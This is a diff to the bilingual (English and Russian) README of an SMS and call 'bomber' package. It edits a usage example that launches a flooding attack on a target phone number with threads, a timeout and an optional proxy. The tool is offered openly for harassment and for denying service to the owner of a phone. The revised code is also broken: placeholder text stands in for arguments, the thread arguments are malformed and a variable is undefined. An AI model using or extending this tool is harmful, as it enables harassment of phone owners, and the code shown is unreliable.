@@ -19,18 +19,27 @@ pip install SMSCallBomber
 ```python
 from smscallbomber import SMSCallBomber
 import time
+import threading
 from argparse import Namespace
 
 # Creating an instance of SMSCallBomber
 args = Namespace(country='Two letter country code (Specify ALL for all countries)', phone=Phone number for attack (without +), time=Attack time in seconds, threads=Number of threads, timeout=Request timeout, proxy=Whether to use a proxy for attack (True or False))
 args.time += time.time()
-bomber = SMSCallBomber(args)
+
+attack_threads = {}
 
 # Starting the attack
-bomber.run()
+def attack_thread_runner(args, message):
+    bomber = SMSCallBomber(args)
+    bomber.run()
+    return bomber
+
+attack_threads = threading.Thread(target=attack_thread_runner, args=(args))
+attack_threads.start()
 
 # Stopping the attack
-bomber.stop()
+attack_threads.join(0)
+del attack_threads
 time.sleep(5) # Increase the time if the results contain zeros
 successful, failed = bomber.send_report()
 print(f"Successfully sent (Not everyone can get there!): {successful}")
@@ -76,18 +85,27 @@ pip install SMSCallBomber
 ```python
 from smscallbomber import SMSCallBomber
 import time
+import threading
 from argparse import Namespace
 
 # Создание экземпляра SMSCallBomber
 args = Namespace(country='Двухбуквенный код страны (Укажите ALL для всех стран)', phone=Номер телефона для атаки (без +), time=Время атаки в секундах, threads=Количество потоков, timeout=Время ожидания запроса, proxy=Использовать ли прокси для атаки (True или False))
 args.time += time.time()
-bomber = SMSCallBomber(args)
+
+attack_threads = {}
 
 # Запуск атаки
-bomber.run()
+def attack_thread_runner(args, message):
+    bomber = SMSCallBomber(args)
+    bomber.run()
+    return bomber
+
+attack_threads = threading.Thread(target=attack_thread_runner, args=(args))
+attack_threads.start()
 
 # Остановка атаки
-bomber.stop()
+attack_threads.join(0)
+del attack_threads
 time.sleep(5) # Увеличьте время если в результатах по нулям
 successful, failed = bomber.send_report()
 print(f"Успешно отправлено(Дойти могут не все!): {successful}")
